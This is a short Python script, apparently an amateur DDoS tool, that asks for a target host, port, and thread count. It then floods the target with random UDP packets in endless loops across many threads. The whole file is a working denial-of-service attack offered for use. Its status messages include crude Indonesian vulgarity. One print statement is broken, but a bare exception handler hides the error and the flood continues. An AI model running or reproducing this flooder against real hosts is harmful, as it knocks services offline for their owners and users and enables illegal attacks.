import socket
import random
import threading
import os , sys

print ("TEST TOOLS")
print ("H4N5 TEST")

ip = str(input(" HOST :"))
port = int(input(" Port :"))
choice = str(input(" Gas ddos? y/n :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("clear")
def udp():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("ATTACK TO %s PORT %s"%(ip,port))

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = udp)

        th.start()